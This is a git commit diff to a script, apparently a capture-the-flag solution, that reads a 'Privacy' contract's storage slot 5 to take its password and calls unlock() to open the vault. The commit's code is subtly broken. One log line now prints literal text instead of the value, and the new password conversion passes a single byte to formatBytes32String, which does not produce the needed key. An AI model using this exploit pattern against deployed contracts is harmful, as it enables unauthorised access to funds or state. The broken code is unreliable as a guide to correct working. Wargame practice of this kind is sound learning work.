54e11033d31ff398145e8ada3be5076102fbc3a8
John M <neshamon@protonmail.com>
2022-02-05 14:07:30 -0600

    Convert store into bytecode

--- scripts/runHackPrivacy.js
+++ scripts/runHackPrivacy.js
@@ -6,15 +6,16 @@ const wallet = new hre.ethers.Wallet( process.env.PRIVATE_KEY, provider );
 const main = async () => {
   const privacyAbi = await hre.artifacts.readArtifact("Privacy");
   const privacyContract = await new hre.ethers.Contract("0xFece0f9e85D38AD3092C2a9Fd7b12d6fe449A86E", privacyAbi.abi, wallet);
-  console.log(`Delegate contract: ${privacyContract.address}`);
+  console.log(`Privacy contract: ${privacyContract.address}`);
 
   let txn1 = await provider.getStorageAt(privacyContract.address, 5);
-  console.log(`Password aquired: ${(hre.ethers.utils.arrayify(txn1)}`);
+  console.log(`Password aquired: (hre.ethers.utils.arrayify(txn1)`);
 
-  let password = hre.ethers.utils.arrayify(txn1);
+  let store = hre.ethers.utils.arrayify(txn1);
+  let password = hre.ethers.utils.formatBytes32String(store[2]);
   console.log("Password stored")
 
-  let txn2 = await privacyContract.unlock(password[2]);
+  let txn2 = await privacyContract.unlock(password);
   console.log("Unlocking...")
   await txn2.wait();
   console.log("Vault unlocked.")
